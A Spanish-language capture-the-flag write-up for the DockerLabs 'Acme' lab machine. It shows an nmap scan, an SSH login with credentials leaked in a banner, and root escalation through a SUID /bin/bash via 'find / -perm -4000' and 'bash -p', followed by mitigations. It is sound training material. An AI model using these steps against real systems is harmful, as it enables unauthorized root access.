# Writeup: Acme

- **Máquina:** Acme (DockerLabs)
- **Enlace:** https://dockerlabs.es/maquinas/292/descargar
- **Dificultad:** Muy Fácil
- **Fecha:** 30 de Octubre 2026

---

## Objetivo
Acceder a privilegios `root` utilizando `ssh` y explotación web.

---

## Despliegue de la máquina
```bash
$ sudo bash auto_deploy.sh acme.tar
```
<img width="576" height="360" alt="Captura de pantalla (273)" src="https://github.com/user-attachments/assets/b0f2c062-c699-4a3f-99b2-4e922598b0d6" />

Para comprobar que el servicio se encuentre activo se usó `ping`:

```bash
$ ping 172.17.0.2
```
Resultado:
```bash
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.228 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.076 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.080 ms
3 packets transmitted, 3 received, 0% packet loss, time 2224ms
```

---

## 1. Reconocimiento
Se realizó escaneo de puertos con `nmap`, revelando dos puertos abiertos:

```bash
$ nmap -p- 172.17.0.2 -oN scanacme.txt
```

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

--- 

## 2. Identificación de vulnerabilidades
Al abrir **http://172.17.0.2/** en un navegador, se muestra un mensaje diciendo que la red se encuentra temporalmente fuera de línea debido a tareas de migración y auditoría de seguridad en la red interna y un aviso explicando cómo acceder a la consola mediante `ssh`.

<img width="712" height="237" alt="Captura de pantalla (298)" src="https://github.com/user-attachments/assets/df460c7e-31aa-455f-8875-ee4777d7bd3a" />



---
## 3. Explotación
### 1. Conexión a la shell 
Se utilizó `ssh`. El nombre de usuario es indistinto ya que al ejecutar el comando, aparece un banner filtrando el nombre y contraseña de un usuario valido.

```bash
$ ssh cualquier_usuario@172.17.0.2 
```

<img width="593" height="129" alt="Captura de pantalla (299)" src="https://github.com/user-attachments/assets/f6b10941-1b3d-4735-b834-8b383c436b8b" />

Sabiendo las credenciales, se utilizó `ssh` nuevamente para acceder a la shell **usuario**:

```bash
$ ssh usuario@172.17.0.2 
```

<img width="460" height="86" alt="Captura de pantalla (300)" src="https://github.com/user-attachments/assets/fca420f9-0269-4f41-af56-30d059440979" />



### 2. Escalada de privilegios 
Se verificaron los permisos `sudo` de **usuario**:

```bash
-bash-5.1$ sudo -l
```
```bash
Sorry, user usuario may not run sudo on 00d689f1f37c.
```

Ya que **usuario** no cuenta con permisos `sudo`, se realizó una búsqueda de archivos con el permiso **SUID** utilizando `find`:

> El permiso **SUID** se asigna a archivos ejecutables. Al ejecutar un archivo con **SUID**, el proceso se ejecuta con los privilegios del propietario de dicho archivo, que suele ser root.

```bash
bash-5.1$ find / -perm -4000 2>/dev/null
```
 * **/** -> raíz del disco duro para que busque por todo el sistema.
 * **-perm -4000** -> filtra los archivos con permisos **SUID**.
 * **2>/dev/null** -> oculta mensajes de error para evitar inundad la terminal.

Esto da como resultado todos los archivos que contienen **SUID**.

<img width="351" height="211" alt="Captura de pantalla (301)" src="https://github.com/user-attachments/assets/73beabe6-5694-430d-bff1-69b7531d855a" />

`/bin/bash` se encuentra en la lista por lo que al ejecutarlo con el parámetro `-p` podremos heredar los privilegios `root`.

```bash
-bash-5.1$ /bin/bash -p
```

<img width="174" height="59" alt="Captura de pantalla (302)" src="https://github.com/user-attachments/assets/984fce2d-179c-47fe-b443-9506263b201f" />

---

Otra forma de corroborar permisos **SUID** es utilizando `ls`.

```bash
-bash-5.1$ ls -l /bin/bash
```

Resultado: 

```bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Si la letra **s** se enecuentra dentro de la primer terna de permisos, significa que el archivo tiene **SUID**.


---
## Acciones de mitigación
- **Escalada de privilegios mediante SUID en `/bin/bash`**: eliminar SUID.
- **Credenciales filtradas mediante banner**: no exponer información de cuentas validas en banners, avisos o páginas web.
---
